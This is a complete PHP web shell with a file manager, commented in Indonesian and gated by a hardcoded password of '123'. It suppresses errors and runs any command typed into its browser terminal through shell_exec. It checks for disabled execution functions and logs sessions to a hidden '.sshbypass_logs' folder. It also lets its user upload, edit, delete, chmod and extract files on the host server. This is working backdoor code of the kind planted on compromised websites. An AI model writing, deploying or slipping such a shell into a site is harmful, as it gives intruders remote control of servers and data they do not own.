<?php
@set_time_limit(0);
@error_reporting(0);
session_start();

// === FITUR LOGIN ===
$LOGIN_PASSWORD = '123'; // Ganti sesuai keinginan
$logged_in = isset($_SESSION['web_shell_logged_in']) && $_SESSION['web_shell_logged_in'] === true;

// Jika belum login dan tidak sedang mencoba login
if (!$logged_in && (!isset($_GET['action']) || $_GET['action'] !== 'do_login')) {
    // Tampilkan halaman login
    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Login - Web Shell</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, #0b1119 0%, #0a0f17 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #c9d1d9;
            }
            .login-container {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
                backdrop-filter: blur(2px);
            }
            .login-header {
                text-align: center;
                margin-bottom: 32px;
            }
            .login-header h1 {
                font-size: 28px;
                font-weight: 700;
                background: linear-gradient(135deg, #58a6ff, #a371f7);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin-bottom: 8px;
            }
            .login-header p {
                color: #8b949e;
                font-size: 14px;
            }
            .input-group {
                margin-bottom: 24px;
            }
            .input-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                font-size: 14px;
                color: #e6edf3;
            }
            .input-group input {
                width: 100%;
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
                padding: 12px 16px;
                font-size: 16px;
                color: #c9d1d9;
                transition: all 0.2s;
            }
            .input-group input:focus {
                outline: none;
                border-color: #58a6ff;
                box-shadow: 0 0 0 3px rgba(88,166,255,0.2);
            }
            .btn-login {
                width: 100%;
                background: #238636;
                border: none;
                border-radius: 12px;
                padding: 12px;
                font-size: 16px;
                font-weight: 700;
                color: white;
                cursor: pointer;
                transition: background 0.2s;
            }
            .btn-login:hover {
                background: #2ea043;
            }
            .error-msg {
                background: #f8514922;
                border-left: 3px solid #f85149;
                padding: 12px;
                border-radius: 10px;
                margin-bottom: 20px;
                font-size: 14px;
                color: #f85149;
                text-align: center;
            }
            .footer {
                text-align: center;
                margin-top: 24px;
                font-size: 12px;
                color: #8b949e;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>🔐 Web Shell</h1>
                <p>Enter password to continue</p>
            </div>
            <?php if (isset($_GET['error'])): ?>
                <div class="error-msg">❌ Invalid password. Try again.</div>
            <?php endif; ?>
            <form method="POST" action="?action=do_login">
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter password" autofocus required>
                </div>
                <button type="submit" class="btn-login">▶ Login</button>
            </form>
            <div class="footer">
                🔒 Secure access only
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Proses login
if (isset($_GET['action']) && $_GET['action'] === 'do_login') {
    $pass = $_POST['password'] ?? '';
    if ($pass === $LOGIN_PASSWORD) {
        $_SESSION['web_shell_logged_in'] = true;
        header('Location: ?');
        exit;
    } else {
        header('Location: ?action=login&error=1');
        exit;
    }
}

// Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: ?action=login');
    exit;
}
// === END FITUR LOGIN ===

// ===== CONFIG =====
$LOG_DIR = __DIR__ . '/.sshbypass_logs';
$MAX_LOG_SIZE = 5 * 1024 * 1024; // 5 MB
// ==================

// IP restriction (optional)
$ALLOWED_IPS = [];
if (!empty($ALLOWED_IPS)) {
    $rip = $_SERVER['REMOTE_ADDR'] ?? '';
    if (!in_array($rip, $ALLOWED_IPS, true)) {
        header('HTTP/1.1 403 Forbidden');
        echo "Forbidden\n";
        exit;
    }
}

// Log directory setup
if (!is_dir($LOG_DIR)) {
    @mkdir($LOG_DIR, 0700, true);
    @file_put_contents($LOG_DIR . '/.htaccess', "<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n<IfModule !mod_authz_core.c>\nDeny from all\n</IfModule>");
}

// Check disabled functions
$disabled = ini_get('disable_functions');
$has_shell = true;
if ($disabled) {
    $df = array_map('trim', explode(',', $disabled));
    foreach (['shell_exec','exec','passthru','system','proc_open'] as $f) {
        if (in_array($f, $df)) { $has_shell = false; break; }
    }
}

// Initialize working directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = __DIR__;
}
$cwd = $_SESSION['cwd'];
if (!is_dir($cwd)) {
    $cwd = __DIR__;
    $_SESSION['cwd'] = $cwd;
}

// Flash messages
if (!isset($_SESSION['flash'])) $_SESSION['flash'] = '';
$flash = $_SESSION['flash'];
$_SESSION['flash'] = '';

// Helpers
function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function redirect($url = '?') {
    header("Location: $url");
    exit;
}
function flash_set($msg) { $_SESSION['flash'] = $msg; }

// Terminal log handling
$sid = session_id();
$logfile = $LOG_DIR . "/session_{$sid}.log";
function append_log($file, $text) {
    @file_put_contents($file, $text, FILE_APPEND | LOCK_EX);
}

// ==================== ACTION HANDLERS ====================
$action = $_REQUEST['action'] ?? null;

// Terminal AJAX endpoints
if (in_array($action, ['run','read','clear'])) {
    if ($action === 'run') {
        $cmd = trim($_POST['cmd'] ?? '');
        if ($cmd === '') {
            header('Content-Type: application/json');
            echo json_encode(['ok'=>false,'err'=>'empty command']);
            exit;
        }

        $time = date('Y-m-d H:i:s');
        append_log($logfile, "[$time] $ $cmd\n");

        if (preg_match('/^cd\s+(.+)/', $cmd, $m)) {
            $newdir = trim($m[1]);
            if ($newdir[0] !== '/') $newdir = $cwd . '/' . $newdir;
            $newdir = realpath($newdir);
            if ($newdir && is_dir($newdir)) {
                $_SESSION['cwd'] = $newdir;
                $out = "Directory changed to: $newdir\n";
            } else {
                $out = "cd: no such directory: $newdir\n";
            }
            append_log($logfile, $out . "\n");
        } else {
            if (!$has_shell) {
                $out = "[ERROR] shell functions disabled on this PHP environment.\n";
            } else {
                $fullcmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
                $out = @shell_exec($fullcmd);
                if ($out === null) $out = "[NOTICE] Command produced no output or shell_exec returned null.\n";
            }
            append_log($logfile, $out . "\n");
        }

        if (file_exists($logfile) && filesize($logfile) > $MAX_LOG_SIZE) {
            $data = @file_get_contents($logfile);
            $keep = substr($data, - (int)($MAX_LOG_SIZE / 2));
            @file_put_contents($logfile, $keep, LOCK_EX);
        }

        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok'=>true, 'output_preview'=>substr($out,0,2000)]);
        exit;
    }

    if ($action === 'read') {
        $content = file_exists($logfile) ? @file_get_contents($logfile) : '';
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
        exit;
    }

    if ($action === 'clear') {
        if (file_exists($logfile)) @unlink($logfile);
        echo "CLEARED\n";
        exit;
    }
}

// Upload handler (pindahkan ke sini agar bisa diproteksi login)
if ($action === 'upload') {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $tmp_name = $_FILES['file']['tmp_name'];
        $original_name = basename($_FILES['file']['name']);
        $target = $cwd . '/' . $original_name;
        if (move_uploaded_file($tmp_name, $target)) {
            flash_set("File uploaded: " . $original_name);
        } else {
            flash_set("Upload failed (cannot move file).");
        }
    } else {
        flash_set("No file or upload error.");
    }
    redirect('?');
}

// File Manager actions
if ($action === 'cd') {
    $path = $_GET['path'] ?? '';
    if ($path === '..') $new = dirname($cwd);
    else {
        if ($path[0] !== '/') $path = $cwd . '/' . $path;
        $new = realpath($path);
    }
    if ($new && is_dir($new)) $_SESSION['cwd'] = $new;
    else flash_set("Invalid directory.");
    redirect('?');
}

if ($action === 'download') {
    $file = $_GET['file'] ?? '';
    $fpath = ($file[0] === '/') ? realpath($file) : realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fpath).'"');
        header('Content-Length: ' . filesize($fpath));
        readfile($fpath);
        exit;
    }
    flash_set("File not found.");
    redirect('?');
}

if ($action === 'delete') {
    $file = $_GET['file'] ?? '';
    $fpath = ($file[0] === '/') ? realpath($file) : realpath($cwd . '/' . $file);
    if ($fpath && file_exists($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        if (is_dir($fpath)) {
            function delTree($dir) {
                $files = array_diff(scandir($dir), ['.','..']);
                foreach ($files as $f) { $p = "$dir/$f"; is_dir($p) ? delTree($p) : unlink($p); }
                return rmdir($dir);
            }
            flash_set(delTree($fpath) ? "Folder deleted." : "Failed to delete folder.");
        } else {
            flash_set(unlink($fpath) ? "File deleted." : "Failed to delete file.");
        }
    } else flash_set("Invalid path.");
    redirect('?');
}

if ($action === 'rename') {
    $old = $_POST['old'] ?? ''; $new = $_POST['new'] ?? '';
    $oldpath = realpath($cwd . '/' . $old);
    $newpath = dirname($oldpath) . '/' . basename($new);
    if ($oldpath && file_exists($oldpath) && strpos($oldpath, realpath($cwd)) === 0) {
        flash_set(@rename($oldpath, $newpath) ? "Renamed." : "Rename failed.");
    } else flash_set("Invalid path.");
    redirect('?');
}

if ($action === 'edit') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        $editFile = $fpath; $editContent = @file_get_contents($fpath);
    } else { flash_set("File not found."); redirect('?'); }
}

if ($action === 'save') {
    $file = $_POST['file'] ?? ''; $content = $_POST['content'] ?? '';
    $fpath = realpath($file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        flash_set(@file_put_contents($fpath, $content) !== false ? "File saved." : "Save failed.");
    } else flash_set("Invalid file.");
    redirect('?');
}

if ($action === 'view') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        $viewContent = @file_get_contents($fpath); $viewFilename = basename($fpath);
    } else { flash_set("File not found."); redirect('?'); }
}

if ($action === 'extract') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        $ext = strtolower(pathinfo($fpath, PATHINFO_EXTENSION));
        $dir = dirname($fpath);
        if ($ext === 'zip' && class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($fpath) === TRUE) { $zip->extractTo($dir); $zip->close(); flash_set("ZIP extracted."); }
            else flash_set("Failed to open ZIP.");
        } elseif (in_array($ext, ['tar','gz','bz2']) || preg_match('/\.tar\.(gz|bz2)$/', basename($fpath))) {
            if ($has_shell) {
                $out = @shell_exec('cd '.escapeshellarg($dir).' && tar -xf '.escapeshellarg($fpath).' 2>&1');
                flash_set("TAR extraction executed.");
            } else flash_set("Shell functions disabled.");
        } else flash_set("Unsupported format.");
    } else flash_set("File not found.");
    redirect('?');
}

if ($action === 'chmod') {
    $file = $_POST['file'] ?? ''; $mode = $_POST['mode'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && file_exists($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        flash_set(@chmod($fpath, octdec($mode)) ? "Permissions changed." : "Chmod failed.");
    } else flash_set("Invalid file.");
    redirect('?');
}

if ($action === 'mkdir') {
    $name = $_POST['dirname'] ?? '';
    if ($name) {
        $newdir = $cwd . '/' . basename($name);
        if (!file_exists($newdir)) flash_set(@mkdir($newdir, 0755) ? "Directory created." : "Failed.");
        else flash_set("Already exists.");
    }
    redirect('?');
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Web Shell + File Manager</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Inter', sans-serif;
      background: #0b1119;
      color: #c9d1d9;
      padding: 20px;
      min-height: 100vh;
    }
    .container {
      max-width: 1300px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 24px;
    }
    .warning {
      background: #f8514922;
      border: 1px solid #f85149;
      color: #f85149;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .flash {
      background: #1a7f3722;
      border-left: 4px solid #2ea043;
      padding: 12px 20px;
      border-radius: 6px;
      font-weight: 500;
    }
    .card {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
    }
    .card-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 16px;
    }
    .card-header h2 {
      font-size: 1.25rem;
      font-weight: 600;
      color: #58a6ff;
    }
    .terminal {
      background: #0a0e14;
      padding: 16px;
      border-radius: 8px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9rem;
      height: 40vh;
      overflow-y: auto;
      white-space: pre-wrap;
      border: 1px solid #1f2937;
      margin-bottom: 12px;
    }
    .input-group {
      display: flex;
      gap: 8px;
    }
    .input-group input {
      flex: 1;
      background: #161b22;
      border: 1px solid #30363d;
      color: #c9d1d9;
      padding: 10px 14px;
      border-radius: 8px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9rem;
    }
    .btn {
      padding: 10px 18px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Inter', sans-serif;
      font-size: 0.85rem;
      transition: filter 0.2s;
    }
    .btn:hover { filter: brightness(1.1); }
    .btn-green { background: #238636; color: white; }
    .btn-red { background: #da3633; color: white; }
    .btn-gray { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
    .btn-sm { padding: 6px 12px; font-size: 0.8rem; }
    .toolbar {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }
    .toolbar form {
      display: flex;
      gap: 8px;
      align-items: center;
    }
    .toolbar input {
      background: #161b22;
      border: 1px solid #30363d;
      color: #c9d1d9;
      padding: 8px 12px;
      border-radius: 8px;
      font-size: 0.85rem;
    }
    .upload-form {
      display: inline-flex;
      gap: 8px;
      align-items: center;
      background: #0d1117;
      padding: 4px 8px;
      border-radius: 8px;
      border: 1px solid #30363d;
    }
    .upload-form input[type="file"] {
      background: #161b22;
      color: #c9d1d9;
      border: none;
      font-size: 0.85rem;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #0d1117;
      border-radius: 8px;
      overflow: hidden;
    }
    th {
      background: #161b22;
      color: #8b949e;
      font-weight: 600;
      text-align: left;
      padding: 12px 16px;
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    td {
      padding: 10px 16px;
      border-bottom: 1px solid #21262d;
      font-size: 0.9rem;
    }
    tr:hover td { background: #161b22; }
    .file-row {
      color: #e6edf3;
      font-family: 'JetBrains Mono', monospace;
    }
    .dir-row { color: #58a6ff; }
    .exec-row { color: #3fb950; }
    .warn-row { color: #f0883e; }
    .danger-row { color: #f85149; }
    .action-cell {
      display: flex;
      gap: 6px;
      flex-wrap: wrap;
    }
    .action-cell a {
      text-decoration: none;
      font-size: 0.8rem;
      font-weight: 500;
      padding: 4px 8px;
      border-radius: 6px;
      background: #21262d;
      color: #c9d1d9;
      transition: 0.2s;
    }
    .action-cell a:hover { background: #30363d; color: white; }
    .edit-view {
      margin-top: 16px;
    }
    .edit-view textarea {
      width: 100%;
      height: 50vh;
      background: #0a0e14;
      border: 1px solid #30363d;
      color: #c9d1d9;
      font-family: 'JetBrains Mono', monospace;
      padding: 16px;
      border-radius: 8px;
    }
    .flex { display: flex; gap: 8px; align-items: center; }
    a { color: #58a6ff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
<div class="container">
  <div class="warning">
    <span>⚠️ Secure Shell Access</span>
    <a href="?action=logout" class="btn btn-gray btn-sm" style="background:#21262d; color:#f85149;">🚪 Logout</a>
  </div>
  <?php if ($flash): ?><div class="flash"><?= h($flash) ?></div><?php endif; ?>

  <!-- Terminal Section -->
  <div class="card">
    <div class="card-header">
      <h2>Terminal</h2>
      <span style="font-family: monospace; font-size:0.8rem; color:#8b949e;">CWD: <?= h($cwd) ?></span>
    </div>
    <div class="terminal" id="term">Connecting...</div>
    <div class="input-group">
      <input id="cmdline" placeholder="Type command and press Enter..." />
      <button class="btn btn-green" id="send">Send</button>
      <button class="btn btn-gray" id="clear">Clear</button>
    </div>
  </div>

  <!-- File Manager Section -->
  <div class="card">
    <div class="card-header">
      <h2>File Manager</h2>
      <span style="font-family: monospace; font-size:0.8rem; color:#8b949e;"><?= h($cwd) ?></span>
    </div>
    <div class="toolbar">
      <a href="?action=cd&path=.." class="btn btn-gray btn-sm">📁 ..</a>
      <a href="?" class="btn btn-gray btn-sm">↻ Refresh</a>
      <form method="post" action="?action=mkdir">
        <input type="text" name="dirname" placeholder="New folder name" required>
        <button type="submit" class="btn btn-green btn-sm">+ Mkdir</button>
      </form>
      <form method="post" action="?action=upload" enctype="multipart/form-data" class="upload-form">
        <input type="file" name="file" required>
        <button type="submit" class="btn btn-green btn-sm">📤 Upload</button>
      </form>
    </div>

    <?php if (isset($editFile)): ?>
      <div class="edit-view">
        <div class="flex" style="margin-bottom:12px;">
          <h3>Editing: <?= h($editFile) ?></h3>
          <a href="?" class="btn btn-gray btn-sm">Cancel</a>
        </div>
        <form method="post" action="?action=save">
          <input type="hidden" name="file" value="<?= h($editFile) ?>">
          <textarea name="content"><?= h($editContent) ?></textarea>
          <button type="submit" class="btn btn-green" style="margin-top:12px;">💾 Save</button>
        </form>
      </div>
    <?php elseif (isset($viewContent)): ?>
      <div style="margin-top:8px;">
        <div class="flex" style="margin-bottom:12px;">
          <h3>Viewing: <?= h($viewFilename) ?></h3>
          <a href="?" class="btn btn-gray btn-sm">← Back</a>
        </div>
        <pre style="background:#0a0e14; padding:16px; border-radius:8px; overflow:auto; max-height:60vh; border:1px solid #30363d; font-family:'JetBrains Mono',monospace; font-size:0.85rem;"><?= h($viewContent) ?></pre>
      </div>
    <?php else: ?>
      <table>
        <thead>
          <tr><th>Name</th><th>Size</th><th>Permissions</th><th style="width:280px;">Actions</th></tr>
        </thead>
        <tbody>
        <?php
        $items = @scandir($cwd);
        if ($items) {
            $dirs = []; $files = [];
            foreach ($items as $item) {
                if ($item === '.') continue;
                $full = $cwd . '/' . $item;
                if (is_dir($full)) $dirs[] = $item;
                else $files[] = $item;
            }
            sort($dirs); sort($files);
            $list = array_merge($dirs, $files);

            foreach ($list as $item):
                $full = $cwd . '/' . $item;
                $isdir = is_dir($full);
                $perms = substr(sprintf('%o', fileperms($full)), -4);
                $size = $isdir ? '-' : filesize($full);
                $ext = pathinfo($item, PATHINFO_EXTENSION);

                $rowClass = 'file-row';
                if ($isdir) {
                    $rowClass = 'dir-row';
                } elseif (is_executable($full)) {
                    $rowClass = 'exec-row';
                } elseif (in_array(strtolower($ext), ['zip','tar','gz','bz2','7z','rar','tgz','tbz2'])) {
                    $rowClass = 'warn-row';
                }
                $mode = fileperms($full);
                if (($mode & 0x0002)) $rowClass = 'danger-row';

                $enc = urlencode($item);
        ?>
          <tr class="<?= $rowClass ?>">
            <td>
              <?= $isdir ? '📁 ' : '📄 ' ?>
              <?php if ($isdir): ?>
                <a href="?action=cd&path=<?= $enc ?>"><?= h($item) ?>/</a>
              <?php else: ?>
                <?= h($item) ?>
              <?php endif; ?>
            </td>
            <td><?= $isdir ? '-' : number_format($size) ?> B</td>
            <td><?= $perms ?></td>
            <td class="action-cell">
              <?php if (!$isdir): ?>
                <a href="?action=view&file=<?= $enc ?>">View</a>
                <a href="?action=edit&file=<?= $enc ?>">Edit</a>
                <a href="?action=download&file=<?= $enc ?>">Download</a>
              <?php endif; ?>
              <a href="#" onclick="if(confirm('Delete <?= addslashes($item) ?>?')) location='?action=delete&file=<?= $enc ?>'">Delete</a>
              <a href="#" onclick="renamePrompt('<?= addslashes($item) ?>')">Rename</a>
              <a href="#" onclick="chmodPrompt('<?= addslashes($item) ?>','<?= $perms ?>')">Chmod</a>
              <?php if (!$isdir && preg_match('/\.(zip|tar|tar\.gz|tar\.bz2|tgz)$/', strtolower($item))): ?>
                <a href="?action=extract&file=<?= $enc ?>" onclick="return confirm('Extract <?= addslashes($item) ?>?')">Extract</a>
              <?php endif; ?>
            </td>
          </tr>
        <?php endforeach;
        } else {
            echo "<tr><td colspan='4'>Cannot read directory.</td></tr>";
        }
        ?>
        </tbody>
      </table>
    <?php endif; ?>
  </div>
</div>

<script>
const ENDPOINT = location.pathname;
const POLL_INTERVAL = 1000;
const term = document.getElementById('term');
const cmdline = document.getElementById('cmdline');
const sendBtn = document.getElementById('send');
const clearBtn = document.getElementById('clear');
let last = '';

async function readLog() {
  try {
    const res = await fetch(`${ENDPOINT}?action=read`, {cache:'no-store'});
    const txt = await res.text();
    if (txt !== last) {
      last = txt;
      term.textContent = txt || '';
      term.scrollTop = term.scrollHeight;
    }
  } catch (e) {
    term.textContent = "[ERROR] " + e;
  }
}

async function runCmd(cmd) {
  try {
    const form = new FormData();
    form.append('cmd', cmd);
    const res = await fetch(`${ENDPOINT}?action=run`, {method:'POST', body: form});
    const j = await res.json();
    if (!j.ok) term.textContent += "\n[ERR] " + (j.err || 'unknown');
  } catch (e) {
    term.textContent += "\n[ERR SEND] " + e;
  }
}

sendBtn.addEventListener('click', () => {
  const c = cmdline.value.trim();
  if (!c) return;
  runCmd(c);
  cmdline.value = '';
});

cmdline.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') { e.preventDefault(); sendBtn.click(); }
});

clearBtn.addEventListener('click', async () => {
  await fetch(`${ENDPOINT}?action=clear`);
  last = '';
  term.textContent = '';
});

readLog();
setInterval(readLog, POLL_INTERVAL);

function renamePrompt(oldname) {
  const n = prompt("New name:", oldname);
  if (n && n !== oldname) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '?action=rename';
    const oldInp = document.createElement('input'); oldInp.type='hidden'; oldInp.name='old'; oldInp.value=oldname;
    const newInp = document.createElement('input'); newInp.type='hidden'; newInp.name='new'; newInp.value=n;
    form.appendChild(oldInp); form.appendChild(newInp);
    document.body.appendChild(form);
    form.submit();
  }
}

function chmodPrompt(fname, current) {
  const m = prompt("New permissions (octal, e.g. 0755):", current);
  if (m) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '?action=chmod';
    const fileInp = document.createElement('input'); fileInp.type='hidden'; fileInp.name='file'; fileInp.value=fname;
    const modeInp = document.createElement('input'); modeInp.type='hidden'; modeInp.name='mode'; modeInp.value=m;
    form.appendChild(fileInp); form.appendChild(modeInp);
    document.body.appendChild(form);
    form.submit();
  }
}
</script>
</body>
</html>